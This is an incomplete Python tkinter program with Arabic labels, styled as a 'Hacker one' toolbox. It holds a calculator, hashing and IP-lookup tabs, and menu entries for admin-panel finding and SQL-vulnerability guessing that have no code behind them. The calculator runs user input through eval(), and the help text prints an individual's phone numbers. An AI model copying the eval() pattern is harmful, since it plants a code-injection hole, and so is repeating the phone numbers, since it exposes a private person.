from tkinter import *
import tkinter
from math import *
##from cmath import *
import parser
import tkinter.messagebox
import hashlib
from tkinter import ttk
import shutil
from os import *
from socket import*
import platform
from tkinter.filedialog import *
#----------------------------------------------
root=Tk()
root.title('Hacker one')
root.configure(bg='Indigo')
#root.resizable(0,0)
root.geometry('704x527+60+0')
root.state('withdrawn')
#----------------------------------------------
root2=Tk()
root2.title('Hacker one')
root2.configure(bg='Indigo')
root2.geometry("800x600+0+0")
root2.state('withdrawn')
########################################################################
#This part for User&password^__^
########################################################################
root3=Tk()
root3.title('A-n-o-n-m-o-u-s')
root3.configure(bg='Indigo')
#root3.resizable(0,0)
root3.geometry("700x500+60+30")
root3.title('Hacker one')
#######################################################################
rootAsk=Tk()
rootAsk.configure(bg='Indigo')
rootAsk.title('A-n-o-n-m-o-u-s')
rootAsk.geometry('500x150+250+240')
rootAsk.resizable(0,0)
rootAsk.state('withdrawn')
#######################################################################
root4=Tk()
root4.title('Hacker one')
root4.configure(bg='Indigo')
#root.resizable(0,0)
root4.geometry('704x476+60+30')
root4.state('withdrawn')
########################################################################
User=StringVar()
Pass_=StringVar()

def ButtonU_P():
    if User.get()=='' and Pass_.get()=='':
        root3.state('withdrawn')
        root.state('normal')
    else:
        print('a7a')
#=====================================================================#
#This part for designer
#=====================================================================#
##im = PhotoImage(file='1.jpg')
##filename = PhotoImage(file = "1.jpg")
##Hack_canvas = canvas.create_image(50, 50, anchor=NE, image=filename)
################################
Hack_canvas=Button(root3,bg='white',width=170,height=130)
Hack_canvas.place(x=250,y=100)
#------------------------------
lbuser=Label(root3,text='تسجيل الدخول',bd=8,relief='groove',bg='Gray',fg='white'
             ,font=('arial','30','bold'))
lbuser.place(x=229,y=10)
#------------------------------
lbuser2=Label(root3,text='أولاً',bd=8,relief='groove',bg='Gray',fg='Yellow'
              ,font=('arial','30','bold'))
lbuser2.place(x=500,y=10)
#==============================================================
lbuser3=Label(root3,text='الإسم',bd=8,relief='ridge',bg='Gray',fg='Yellow'
              ,font=('arial','16','bold'))
lbuser3.place(x=40,y=250)
#------------------------------
lbpass=Label(root3,text='كلمة السر',bd=8,relief='ridge',bg='Gray',fg='black'
             ,font=('arial','16','bold'))
lbpass.place(x=334,y=250)
#==============================================================
entUser=Entry(root3,bg='Gray',fg='yellow',bd=8,width=30
              ,font=('arial','9','bold'),textvariable=User,
              selectbackground="Blue",insertwidth=5)
entUser.place(x=100,y=250)
#--------------------------------------------
entpass=Entry(root3,bg='Gray',fg='yellow',bd=8,width=30
              ,font=('arial','9','bold'),textvariable=Pass_,
              selectbackground="Blue",insertwidth=5)
entpass.place(x=425,y=250)
#--------------------------------------------
btInput=Button(root3,text='الدخول',bg='Gray',fg='dark red'###<<<===========================================================
               ,font=('arial','20','bold'),bd=9,command=ButtonU_P)
btInput.place(x=300,y=325)
#========================End The User&pass==============================#
#=======================================================================#
def Window4():
    root4.state('normal')
    root.state('withdrawn')
    root2.state('withdrawn')
########################################################################
def help_():
    root2.state('normal')
    root.state('withdrawn')
########################################################################

##TXT_HElP=Text(root2,
##          font=('Courier','10','bold'),bg='Gray',
##          fg='Yellow',
##          highlightbackground='red',
##          insertbackground='red',
##          insertwidth=8,
##          insertborderwidth=8,
##          insertontime=950,
##          padx=35,
##          pady=35,
##          relief='groove',bd=9,height=19,width=64)
##TXT_HElP.pack()
##TXT_HElP.insert(INSERT,K)
###------------------------------------------------------------
##sb5325=Scrollbar(root2)
###-------------------------------
##sb5325.pack(side=RIGHT,fill=Y)
##sb5325.config(command=TXT_HElP.yveiw)
##TXT_HELP.config(yscrollcommand=sb5325.set)
    
K='''
        (الألة الحاسبة) calculator
    -----------------------------------------
    أضغط علي أي زر من الأزرار الأرقام لأدخال رقم معين و أضغط علي الأزرار الخاصة بالعمليات الحسابية
----------------------------------------------------------------
    (برنامج التشفير)
    ----------------------------------
    أدخل أي كلمة أو رمز أو رقم أو أي كلام بأي لغة في العالم ثم أضغط علي أي زر للتشفير لكن أولا أعلم أخي الكريم أنه يوجد عندك خمس أنواع من التشفير
    ------------------------
    Md5[1]
    Sha1[2]
    Sha224[3]
    Sha384[4]
    Sha512[5]

    --------------------------------------------------------------		   	 (IpGrapper)
    ----------------------------------
    :أولا
    -----
    Get أكتب أسم أي موقع ثم أضغط علي الزر
    ^_^ لجلب الأي بي ثم أنسخه بالماوس أو كما تشاء
    .ثم أفعل بالأي بي ما شئت
    ----------------------------------------------------------------
    ملحوظة في كامل البرنامج تم وضع خاصية عند الضغط علي الزر الأيمن للفأرة Copy & Paste & Cut & Select all & Delete أن يكون هناك
    \/__\/ ولم تكن موجوده من قبل
    ---------------------------------------------------------------
    (بفضل الله تم وضع هذه الخاصية في البرنامج من قبل المبرمج عبدالله طارق)
    ---------------------------------------------------------------
    ---------------------------------------------------------------
    (For_code)
    -------------------------------
    هذا محرر يمكن أن تكتب عليه كود بأي لغة برمجية و تشغيلها لكن يجب عليك أن يكون مثبت عندك مشغل اللغة البرمجية حتي لا تتسأل لماذا الكود لا
    يشتغل علي جهازي

    -------------------------------
    للعلم البرنامج يشرح نفسه
    ---------------------------------------------------------------







    لكن إذا أحتجت مساعده أتصل علي الرقم التالي
    ------------------------------------------
    01063037198
    أو
    01023010639
    ------------------------------------------


'''
TXT_HELP=Text(root2,
         font=('arial','10','bold'),bg='Gray',
         fg='Yellow',
         highlightbackground='red',
         insertbackground='red',
         insertwidth=8,
         insertborderwidth=8,
         insertontime=950,
         padx=35,
         pady=35,
         relief='groove',bd=9,height=19,width=64)
TXT_HELP.place(x=70,y=78)
#-----------------------------------
sb5325=Scrollbar(root2)
#-----------------------------------

#-------------------------------
sb5325.pack(side=RIGHT,fill=Y)
sb5325.config(command=TXT_HELP.yview)
TXT_HELP.config(yscrollcommand=sb5325.set)
TXT_HELP.insert(INSERT,K)
#----------------------------------------------------------------------------
def INFO_2():
    tkinter.messagebox.showinfo("about","تم كتابة هذا البرنامج في 2019 \nمن قبل المبرمج عبدالله طارق\n    للأقتراحات و للتواصل \n--------------------------------\n          01063037198\n          01023010693\n--------------------------------")

#----------------------------------------------------------------------------
def bth():
    root2.state('withdrawn')
    root.state('normal')
#-----------------------------------------------------------------------------
bth=Button(root2,text='الرجوع',bg='Gray',fg='white',bd=6,activebackground='Gray',
           font=('arial','15','bold')
           ,command=bth)
bth.place(x=360,y=420)
########################################################################
#############################Menu#######################################
########################################################################
def Exit():
    Exit=tkinter.messagebox.askyesno("A-n-o-n-m-o-u-s","!هل حقاً تريد الخروج ؟")
    if Exit>0:
        root.destroy()
        return
def Exit_2_Keyboard(event):
    Exit=tkinter.messagebox.askyesno("A-n-o-n-m-o-u-s","!هل حقاً تريد الخروج ؟")
    if Exit>0:
        root.destroy()
        return
    
    
def Scientific():
    root.resizable(0,0)
    root.geometry("700x500+170+120")

def Standard():
    root.resizable(0,0)
    root.geometry("400x500+170+120")
#################################
#This Part for display
#################################    
def blue():
    root.configure(bg='blue')

def red():
    root.configure(bg='red')
    
def Indigo():
    root.configure(bg='Indigo')

def black():
    root.configure(bg='black')

def white():
    fm2.configure(bg='white')
#=======================================================#
def Undo():
    pass
def Redo():
    pass
#=======================================================#
def Mblack():
    fm1.configure(bg='black')
    fm2.configure(bg='black')
    fm3.configure(bg='black')
    fm4.configure(bg='black')
    fm5.configure(bg='black')
    fm6.configure(bg='black')
    fm7.configure(bg='black')
def Mwhite():
    fm1.configure(bg='white')
    fm2.configure(bg='white')
    fm3.configure(bg='white')
    fm4.configure(bg='white')
    fm5.configure(bg='white')
    fm6.configure(bg='white')
    fm7.configure(bg='white')
def Mblue():
    fm1.configure(bg='blue')
    fm2.configure(bg='blue')
    fm3.configure(bg='blue')
    fm4.configure(bg='blue')
    fm5.configure(bg='blue')
    fm6.configure(bg='blue')
    fm7.configure(bg='blue')
    fm8.configure(bg='blue')
def Mred():
    fm1.configure(bg='red')
    fm2.configure(bg='red')
    fm3.configure(bg='red')
    fm4.configure(bg='red')
    fm5.configure(bg='red')
    fm6.configure(bg='red')
    fm7.configure(bg='red')
    fm8.configure(bg='red')
def MIndigo():
    fm1.configure(bg='Indigo')
    fm2.configure(bg='Indigo')
    fm3.configure(bg='Indigo')
    fm4.configure(bg='Indigo')
    fm5.configure(bg='Indigo')
    fm6.configure(bg='Indigo')
    fm7.configure(bg='Indigo')
    fm8.configure(bg='Indigo')
def MYellow():
    fm1.configure(bg='Yellow')
    fm2.configure(bg='Yellow')
    fm3.configure(bg='Yellow')
    fm4.configure(bg='Yellow')
    fm5.configure(bg='Yellow')
    fm6.configure(bg='Yellow')
    fm7.configure(bg='Yellow')
    fm8.configure(bg='Yellow')
def Morange():
    fm1.configure(bg='orange')
    fm2.configure(bg='orange')
    fm3.configure(bg='orange')
    fm4.configure(bg='orange')
    fm5.configure(bg='orange')
    fm6.configure(bg='orange')
    fm7.configure(bg='orange')
    fm8.configure(bg='orange')
def Mpink():
    fm1.configure(bg='pink')
    fm2.configure(bg='pink')
    fm3.configure(bg='pink')
    fm4.configure(bg='pink')
    fm5.configure(bg='pink')
    fm6.configure(bg='pink')
    fm7.configure(bg='pink')
    fm8.configure(bg='pink')
def MGray():
    fm1.configure(bg='Gray')
    fm2.configure(bg='Gray')
    fm3.configure(bg='Gray')
    fm4.configure(bg='Gray')
    fm5.configure(bg='Gray')
    fm6.configure(bg='Gray')
    fm7.configure(bg='Gray')
    fm8.configure(bg='Gray')
def Mpurple():
    fm1.configure(bg='purple')
    fm2.configure(bg='purple')
    fm3.configure(bg='purple')
    fm4.configure(bg='purple')
    fm5.configure(bg='purple')
    fm6.configure(bg='purple')
    fm7.configure(bg='purple')
    fm8.configure(bg='purple')
def Mgreen():
    fm1.configure(bg='green')
    fm2.configure(bg='green')
    fm3.configure(bg='green')
    fm4.configure(bg='green')
    fm5.configure(bg='green')
    fm6.configure(bg='green')
    fm7.configure(bg='green')
    fm8.configure(bg='green')
def MLime():
    fm1.configure(bg='Lime')
    fm2.configure(bg='Lime')
    fm3.configure(bg='Lime')
    fm4.configure(bg='Lime')
    fm5.configure(bg='Lime')
    fm6.configure(bg='Lime')
    fm7.configure(bg='Lime')
    fm8.configure(bg='Lime')
#################################
#This Part for display-End######
#################################
new_file_icon = PhotoImage(file='icons/new_file.gif')
open_file_icon = PhotoImage(file='icons/open_file.gif')
save_file_icon = PhotoImage(file='icons/save.gif')
###############################
def openfile():
        f=askopenfile(mode='r',defaultextension=".py",filetypes=[("All Files","*.*"),
                                                                 ("Text Documents","*.txt"),
                                                                 ("Python File","*.py"),
                                                                 ("Movie File","*.mp4"),
                                                                 ("Ritch Text Format","*.rtf"),
                                                                 ("Batch File","*.bat"),
                                                                 ("HTML File","*.html"),
                                                                 ("HTML File","*.htm"),
                                                                 ("PHP FILE","*.php"),
                                                                 ("JavaScript File","*.js"),
                                                                 ("Excetuble File","*.exe"),
                                                                 ("Zip File","*.zip"),
                                                                 ("Rar archive","*.rar"),
                                                                 ("PDF File","*.pdf"),
                                                                 ("ISO","*.iso"),
                                                                 ("Visual Basic File","*.vb"),
                                                                 ("C++ File","*.cpp"),
                                                                 ("Java File","*.java"),
                                                                 ("DLL File","*.dll"),
                                                                 ("Perl File","*.pl")])
        t=f.read()
        TXT.delete(0.0,END)
        TXT.insert(0.0,t)
        ntb.select(7)
def saveasfile():
        f=asksaveasfile(mode='w',initialfile='Untitled.txt',
                        defaultextension=".py",
                        filetypes=[("All Files","*.*"),
                                  ("Text Documents","*.txt"),
                                  ("Python File","*.py"),
                                  ("Movie File","*.mp4"),
                                  ("Ritch Text Format","*.rtf"),
                                  ("Batch File","*.bat"),
                                  ("HTML File","*.html"),
                                  ("HTML File","*.htm"),
                                  ("PHP File","*.php"),
                                  ("JavaScript File","*.js"),
                                  ("Excetuble File","*.exe"),
                                  ("Zip File","*.zip"),
                                  ("Rar archive","*.rar"),
                                  ("PDF File","*.pdf"),
                                  ("ISO File","*.iso"),
                                  ("Visual Basic File","*.vb"),
                                  ("C++ File","*.cpp"),
                                  ("Java File","*.java"),
                                  ("DLL File","*.dll"),
                                  ("Perl File","*.pl")])
        t=TXT.get(0.0,END)
        ntb.select(7)
        try:
            f.write(t.rstrip())
        except:
            showerror(title='Oops',message='Sorry can\'t save the file')
###############################
def open_file(event=None):
    # tkFileDialog is a module with open and save dialog functions

    """
                                      tkFileDialog has 3 attributes:

      ||Attribute||             ||Parameters||                                ||Purpose||

    .askopenfilename      Directory, Title, Extension         To open file: Dialog that requests selection of
                                                                            an existing file
    .asksaveasfilename    Directory, Title, Extension         To save file: Dialog that requests creation or
                                                                            replacement of a file
      .askdirectory                  None                     To open directory
    """

#     input_file_name = tkinter.filedialog.askopenfilename(defaultextension=".txt", filetypes=[("All Files", "*.*"),
#                                                                                              ("Text Docs", "*.txt"),
#                                                                                              ("HTML", "*.html"),
#                                                                                              ("CSS", "*.css"),
#                                                                                              ("JavaScript", "*.js")])
#     # it is file dialog that requests the selection of an existing file
#     if input_file_name:
#         global file_name # the global variable
#         file_name = input_file_name  # the path of the selected file is stored in this variable
#         root.title('{} - {}'.format(os.path.basename(file_name), PROGRAM_NAME)) # changing the title to that of the new file
#         content_text.delete(1.0, END)
#         with open(file_name) as _file:
#             content_text.insert(1.0, _file.read()) # function to read the file requested
    
#     on_content_changed()


# # this function is responsible to write a file or simply store a file
# def write_to_file(file_name):
#     try:
#         # The first part, "1.0" means that the input should be read from line one, character zero (ie: the very first
#         # character). END is an imported constant which is set to the string "end". The END part means to read until
#         # the end of the text box is reached. The only issue with this is that it actually adds a newline to our input.
#         # So, in order to fix it we should change END to end-1c(Thanks Bryan Oakley) The -1c deletes 1 character, while
#         # -2c would mean delete two characters, and so on
#         content = content_text.get(1.0, 'end-1c')
#         with open(file_name, 'w') as the_file:
#             the_file.write(content) # function to write to the mentioned file
#     except IOError:
#         pass  


# # this function is a save as function where I have used the .askesaveasfilename attribute of file dialog
# def save_as(event=None):
#     input_file_name = tkinter.filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("All Files", "*.*"),
#                                                                                                ("Text Docs", "*.txt"),
#                                                                                                ("HTML", "*.html"),
#                                                                                                ("CSS", "*.css"),
#                                                                                                ("JavaScript", "*.js")])
#     # File dailog that requests creation or replacement of a file
#     if input_file_name:
#         global file_name
#         file_name = input_file_name  # path is stored here
#         write_to_file(file_name)  # this will write a file
#         # a function already defined above
#         root.title('{} - {}'.format(os.path.basename(file_name), PROGRAM_NAME))
#     return "break"
    

# # this function will save the file or overwrite the existing file with the changes
# def save(event=None):
#     global file_name
#     if not file_name:
#         save_as()
#     else:
#         write_to_file(file_name)
#     return "break"
##,image=open_file_icon,accelerator='Ctrl+O',
##image=open_file_icon,accelerator='Ctrl+S',
######################
clac=Frame(root)
clac.pack()
menubar=Menu(clac)
filemenu=Menu(menubar)
menubar.add_cascade(label="File",menu=filemenu)
filemenu.add_command(label="Open in Text (for code)        Ctrl+O",command=openfile)
filemenu.add_command(label="Save as from Text (for code)      Ctrl+S",command=saveasfile)
filemenu.add_separator()
filemenu.add_command(label="خروج                         Alt+F4",command=Exit)
#=============================================================
#=====================This part for Menu======================
#=============================================================
editmenu=Menu(clac)
editmenu=Menu(menubar)
menubar.add_cascade(label="Edit",menu=editmenu)
editmenu.add_command(label="Undo                  Ctrl+Z",command=Undo)
editmenu.add_command(label="Redo                  Ctrl+Y",command=Redo)
##################################################
editmenu3=Menu(clac)
editmenu3=Menu(menubar)
menubar.add_cascade(label="Frameمظهرال",menu=editmenu3)
editmenu3.add_command(label="(أسود(جميل جداً",command=Mblack)
editmenu3.add_command(label="أزرق",command=Mblue)
editmenu3.add_command(label="أبيض",command=Mwhite)
editmenu3.add_command(label="بنفسجي",command=MIndigo)
editmenu3.add_command(label="أصفر",command=MYellow)
editmenu3.add_command(label="أحمر",command=Mred)
editmenu3.add_command(label="برتقالي",command=Morange)
editmenu3.add_command(label="وردي",command=Mpink)
editmenu3.add_command(label="أخضر",command=Mgreen)
editmenu3.add_command(label="وردي فاتح",command=Mpurple)
editmenu3.add_command(label="فضي",command=MGray)
editmenu3.add_command(label="ليمون",command=MLime)
###################################################
editmenu6=Menu(clac)
editmenu6=Menu(menubar)
menubar.add_cascade(label="إختراق",menu=editmenu6)
editmenu6.add_command(label="الموضع لوحة علي الحصول")
editmenu6.add_command(label="SQL ثغرة علي التخمين")
###################################################
editmenu4=Menu(clac)
editmenu4=Menu(menubar)
menubar.add_cascade(label="مساعدة",menu=editmenu4)
editmenu4.add_command(label="تعليمات",command=help_)
editmenu4.add_command(label="عن البرنامج",command=INFO_2)
###################################################
#=============================================================
#=====================This part for Frame=====================
#=============================================================
ntb=ttk.Notebook(clac)
ntb.pack()
fm1=Frame(ntb,bg='Indigo',height=510,width=640)
fm2=Frame(ntb,height=510,width=700,bg='Indigo')
fm3=Frame(ntb,bg='Indigo',height=510,width=640)
fm4=Frame(ntb,bg='Indigo',height=510,width=640)
fm5=Frame(ntb,bg='Indigo',height=510,width=640)
fm6=Frame(ntb,bg='Indigo',height=510,width=640)
fm7=Frame(ntb,bg='Indigo',height=510,width=640)
fm8=Frame(ntb,bg='Indigo',height=510,width=640)
#-----------------------------------
ntb.add(fm1,text='حاسبة ألة')
ntb.add(fm2,text='التشفير')
ntb.add(fm3,text='Ip Grapper.v4')
ntb.add(fm4,text='Attack!!')
ntb.add(fm5,text='MakeFile...')
ntb.add(fm6,text='جهازي عن')
ntb.add(fm7,text='المساعد')
ntb.add(fm8,text='for_Code')
ntb.select(0)
#====================================End Programme 1==================================================================#
#=====================================================================================================================#
#############################################
#This part for Time in Window
#############################################
var=StringVar()
var22=StringVar()
rdd1=IntVar()
rdd2=IntVar()
operator=""
try:
    def btnclick222_333(numbers):
        global operator
        operator=operator+str(numbers)
        var.set(operator)

    def AC():
        global operator
        operator=""
        var.set("")
        
    def C():
        global operator
        operator=""
        var.set("")
        

    def sum_():
        global operator
        sumup=eval(str(operator))
        var.set(sumup)
        operator=""

    def sum_11():
        global operator
        sumup=eval(str(operator))
        var.set(sumup)
        operator=""
        
    def btnclick(numbers):
        global operator
        operator=operator+str(numbers)
        var22.set(operator)
        
    def btnclick_2(numbers):
        global operator
        operator=operator+str(numbers)
        var.set(operator)

    def AC():
        global operator
        operator=""
        var22.set("")
        var.set("")
        
    def C():
        global operator
        operator=""
        var22.set("")
        var.set("")
        
    def sum_22():
        global operator
        sumup=eval(str(operator))
        var22.set(sumup)
        operator=""
except Exception:
    pass

def C():
    global operator
    operator=""
    var22.set("")
    var.set("")




def Standard():
    global operator
    operator=""
    var.set("")
    rd1.place_configure(x=595,y=73)
    rd2.place_configure(x=480,y=73)
    ent2.pack_forget()
    nmC222.place_forget()
    btnpow.place_forget()
    btnQos.place_forget()
    btnsqrt.place_forget()
    btnsin.place_forget()
    btncos.place_forget()
    btntan.place_forget()
    btnlog.place_forget()
    btnlog10.place_forget()
    btntanh.place_forget()
    btnlog2.place_forget()
    btncosh.place_forget()
    btnsinh.place_forget()
    btplus2.place_forget()
    btmins2.place_forget()
    btmult2.place_forget()
    __sum.place_forget()
    btdiv2.place_forget()
    num1_2.place_forget()
    num2_2.place_forget()
    num3_2.place_forget()
    num4_2.place_forget()
    num5_2.place_forget()
    num6_2.place_forget()
    num7_2.place_forget()
    num8_2.place_forget()
    num9_2.place_forget()
    nm0_2.place_forget()
    nmdot_2.place_forget()
    nmWa_2.place_forget()
    #######################
    ent.pack()
    btplus.place(x=482,y=230)
    btmins.place(x=482,y=150)
    btmult.place(x=398,y=150)
    btdiv.place(x=398,y=232)
    sum_.place(x=400,y=350)
    AC.place(x=580,y=220)
    CE_1.place(x=90,y=373)
    num1.place(x=90,y=288)
    num2.place(x=185,y=288)
    num3.place(x=282,y=288)
    num4.place(x=90,y=208)
    num5.place(x=185,y=208)
    nm6.place(x=282,y=208)
    nm7.place(x=90,y=123)
    nm8.place(x=185,y=123)
    nm9.place(x=282,y=123)
    nm0.place(x=185,y=373)
    nmt.place(x=282,y=373)
    



 
ent=Entry(fm1
      ,textvariable=var
      ,bg='Gray',fg='yellow'
      ,font=('arial','33','bold')
      ,bd=10,cursor='arrow',selectbackground='Indigo',insertwidth=0,
          width=26,insertbackground='Gray')







############################################
#This part for Button operator
############################################
##################++++++++##################
############################################
btplus=Button(fm1,text='+',bg='Gray',fg='yellow',bd=12
              ,font=('times',20,'bold'),
              activebackground='Gray',
              activeforeground='Gray',
              height=0
              ,width=3,
              command=lambda :btnclick222_333("+"))

##############################################
################------------##################
##############################################
btmins=Button(fm1
              ,text='-'
              ,bg='Gray'
              ,fg='yellow'
              ,bd=12
              ,font=('times',20,'bold'),
              activebackground='Gray',
              activeforeground='Gray',
              height=0,
              width=3,
              command=lambda :btnclick222_333("-"))

##############################################
################xxxxxxxxxxxx##################
##############################################
btmult=Button(fm1,
              text='x',
              bg='Gray',
              fg='yellow',
              bd=12,
              font=('times',20,'bold'),
              activebackground='Gray',
              activeforeground='Gray',
              height=0
              ,width=3,
              command=lambda :btnclick222_333("*"))

#############################################
################///////////////##################
##############################################
btdiv=Button(fm1,
             text='/',
             bg='Gray',
             fg='yellow',
             bd=12,
             font=('times',20,'bold'),
             activebackground='Gray',
             activeforeground='Gray',
             height=0
             ,width=3,
             command=lambda :btnclick222_333("/"))
#-----------------------------------------------------------------------------------------------------------------------#
sum_=Button(fm1,
            text='=',
            bg='Gray',
            fg='dark red',
            bd=12,
            font=('times',20,'bold'),
            activebackground='Gray',
            activeforeground='Gray',
            height=1
            ,width=15,
            command=sum_)

#----------------------------------------------------------------
AC=Button(fm1,
          text='AC',
          bg='Gray',
          fg='white',
          bd=12,
          font=('times',20,'bold'),
          activebackground='Gray',
          activeforeground='Gray',
          height=0
          ,width=4,
          command=C)
#-----------------------------------------------
CE_1=Button(fm1,
            text='CE',
            bg='Gray',
            fg='black',
            bd=12,
            font=('times',20,'bold'),
            activebackground='Gray',
            activeforeground='Gray',
            height=0,
            width=3
            ,command=C)

#num1.place(x=118,y=268)
#############################################
#This Part For Number Button
#############################################
num1=Button(fm1,
            text='1',
            bg='Gray',
            fg='black',
            bd=12,
            font=('times',20,'bold'),
            activebackground='Gray',
            activeforeground='Gray',
            height=0,
            width=3
            ,command=lambda :btnclick222_333(1))



num2=Button(fm1,
            text='2',
            bg='Gray'
            ,fg='black',
            bd=12
            ,font=('times',20,'bold'),
            activebackground='Gray',
            activeforeground='Gray',
            height=0,
            width=3
            ,command=lambda :btnclick222_333(2))



num3=Button(fm1,
            text='3',
            bg='Gray',
            fg='black'
            ,bd=12,
            font=('times',20,'bold'),
            activebackground='Gray',
            activeforeground='Gray',
            height=0,
            width=3,
            command=lambda :btnclick222_333(3))



num4=Button(fm1,
            text='4',
            bg='Gray',
            fg='black',
            bd=12,
            font=('times',20,'bold'),
            activebackground='Gray',
            activeforeground='Gray',
            height=0,
            width=3,
            command=lambda :btnclick222_333(4))




num5=Button(fm1
            ,text='5'
            ,bg='Gray'
            ,fg='black'
            ,bd=12
            ,font=('times',20,'bold'),
            activebackground='Gray',
            activeforeground='Gray'
            ,height=0,width=3,
            command=lambda :btnclick222_333(5))



nm6=Button(fm1,text='6',
           bg='Gray',
           fg='black',
           bd=12
           ,font=('times',20,'bold'),
           activebackground='Gray',
           activeforeground='Gray',
           height=0,
           width=3,
           command=lambda :btnclick222_333(6))


nm7=Button(fm1,text='7',
           bg='Gray',
           fg='black',
           bd=12,
           font=('times',20,'bold'),
           activebackground='Gray',
           activeforeground='Gray',
           height=0,
           width=3,
           command=lambda :btnclick222_333(7))



nm8=Button(fm1,text='8',
           bg='Gray',
           fg='black'
           ,bd=12,
           font=('times',20,'bold'),
           activebackground='Gray',
           activeforeground='Gray',
           height=0,
           width=3,
           command=lambda :btnclick222_333(8))


nm9=Button(fm1,
           text='9',
           bg='Gray',
           fg='black',
           bd=12,
           font=('times',20,'bold'),
           activebackground='Gray',
           activeforeground='Gray',
           height=0,
           width=3,
           command=lambda :btnclick222_333(9))


nm0=Button(fm1
           ,text='0'
           ,bg='Gray'
           ,fg='black'
           ,bd=12
           ,font=('times',20,'bold'),
           activebackground='Gray',
           activeforeground='Gray'
           ,height=0,width=3,
           command=lambda :btnclick222_333(0))


nmt=Button(fm1
           ,text='.'
           ,bg='Gray'
           ,fg='yellow'
           ,bd=12
           ,font=('times',20,'bold'),
           activebackground='Gray',
           activeforeground='Gray'
           ,height=0
           ,width=3,
           command=lambda :btnclick222_333('.'))



################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
def Scientific():
    global operator
    operator=""
    var22.set("")
    rd1.place_configure(x=595,y=70)
    rd2.place_configure(x=480,y=70)
    ent2.pack()
    ent.pack_forget()
    #place_forget()
    btplus.place_forget()
    btmins.place_forget()
    btmult.place_forget()
    btdiv.place_forget()
    sum_.place_forget()
    AC.place_forget()
    num1.place_forget()
    num2.place_forget()
    num3.place_forget()
    num4.place_forget()
    num5.place_forget()
    nm6.place_forget()
    nm7.place_forget()
    nm8.place_forget()
    nm9.place_forget()
    nm0.place_forget()
    nmt.place_forget()
    CE_1.place_forget()
    #####################
    nmC222.place(x=21,y=95)
    btnpow.place(x=275,y=95)
    btnQos.place(x=187,y=95)
    btnsqrt.place(x=100,y=95)
    btnsin.place(x=358,y=182)
    btncos.place(x=448,y=182)
    btntan.place(x=535,y=182)
    btnlog.place(x=358,y=95)
    btnlog10.place(x=445,y=95)
    btntanh.place(x=535,y=264)
    btnlog2.place(x=537,y=95)
    btncosh.place(x=448,y=264)
    btnsinh.place(x=358,y=264)
    btplus2.place(x=535,y=346)
    btmult2.place(x=445,y=346)
    __sum.place(x=625,y=100)
    btdiv2.place(x=358,y=346)
    num1_2.place(x=87,y=346)
    num2_2.place(x=177,y=346)
    num3_2.place(x=267,y=346)
    num4_2.place(x=87,y=264)
    num5_2.place(x=177,y=264)
    num6_2.place(x=267,y=264)
    num7_2.place(x=87,y=176)
    num8_2.place(x=177,y=176)
    num9_2.place(x=267,y=176)
    nm0_2.place(x=87,y=428)
    nmdot_2.place(x=177,y=428)
    nmWa_2.place(x=267,y=428)




    








    

############################################
#This part for Button operator Scientific
############################################
##################++++++++##################
nmC222=Button(fm1
           ,text='CE'
           ,bg='Gray'
           ,fg='white'
           ,bd=12
           ,font=('times',17,'bold'),
           activebackground='Gray',
           activeforeground='Gray',
           height=0
           ,width=3,
           command=C)


btnpow=Button(fm1,text='x^2',bg='Gray',fg='yellow',bd=13,font=('times',17,'bold'),
          activebackground='Gray',
          activeforeground='Gray',
          height=0
          ,width=3,command=lambda :btnclick("pow("))


btnQos=Button(fm1,text=')',bg='Gray',fg='yellow',bd=13,font=('times',17,'bold'),
          activebackground='Gray',
          activeforeground='Gray',
          height=0
          ,width=3,command=lambda :btnclick(")"))


btnsqrt=Button(fm1,text='√',bg='Gray',fg='yellow',bd=13,font=('times',17,'bold'),
          activebackground='Gray',
          activeforeground='Gray',
          height=0
          ,width=3,command=lambda :btnclick("sqrt("))


btnsin=Button(fm1,text='sin',bg='Gray',fg='yellow',bd=13,font=('times',17,'bold'),
          activebackground='Gray',
          activeforeground='Gray',
          height=0
          ,width=3,command=lambda :btnclick("sin("))


btncos=Button(fm1,text='cos',bg='Gray',fg='yellow',bd=13,font=('times',17,'bold'),
          activebackground='Gray',
          activeforeground='Gray',
          height=0
          ,width=3,command=lambda :btnclick("cos("))


btntan=Button(fm1,text='tan',bg='Gray',fg='yellow',bd=13,font=('times',17,'bold'),
          activebackground='Gray',
          activeforeground='Gray',
          height=0
          ,width=3,command=lambda :btnclick("tan("))


btnlog=Button(fm1,text='/',bg='Gray',fg='yellow',bd=13,font=('times',17,'bold'),
          activebackground='Gray',
          activeforeground='Gray',
          height=0
          ,width=3,command=lambda :btnclick("/"))


btnlog10=Button(fm1,text='x',bg='Gray',fg='yellow',bd=13,font=('times',17,'bold'),
          activebackground='Gray',
          activeforeground='Gray',
          height=0
          ,width=3,command=lambda :btnclick("*"))



btntanh=Button(fm1,text='tanh',bg='Gray',fg='yellow',bd=13,font=('times',17,'bold'),
          activebackground='Gray',
          activeforeground='Gray',
          height=0
          ,width=3,command=lambda :btnclick("tanh("))


btnlog2=Button(fm1,text='+',bg='Gray',fg='yellow',bd=13,font=('times',17,'bold'),
          activebackground='Gray',
          activeforeground='Gray',
          height=0
          ,width=3,command=lambda :btnclick("+"))


btnlgamma=Button(fm1,text='lgamma',bg='Gray',fg='yellow',bd=13,font=('times',17,'bold'),
          activebackground='Gray',
          activeforeground='Gray',
          height=0
          ,width=3,command=lambda :btnclick("lgamma("))


btncosh=Button(fm1,text='cosh',bg='Gray',fg='yellow',bd=13,font=('times',17,'bold'),
          activebackground='Gray',
          activeforeground='Gray',
          height=0
          ,width=3,command=lambda :btnclick("cosh("))


btnsinh=Button(fm1,text='log',bg='Gray',fg='yellow',bd=13,font=('times',17,'bold'),
          activebackground='Gray',
          activeforeground='Gray',
          height=0
          ,width=3,command=lambda :btnclick("log("))


btntrunc=Button(fm1,text='log10',bg='Gray',fg='yellow',bd=13,font=('times',17,'bold'),
          activebackground='Gray',
          activeforeground='Gray',
          height=0
          ,width=4,command=lambda :btnclick("log10("))
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
ent2=Entry(fm1
      ,textvariable=var22
      ,bg='Gray',fg='yellow'
      ,font=('arial','29','bold')
      ,bd=10,cursor='arrow',selectbackground='Indigo',width=30
           ,insertwidth=0,insertbackground='Gray')
##############################################
################------------##################
##############################################
btplus2=Button(fm1,text='-',bg='Gray',fg='yellow',bd=12,font=('times',17,'bold'),
          activebackground='Gray',
          activeforeground='Gray',
          height=0
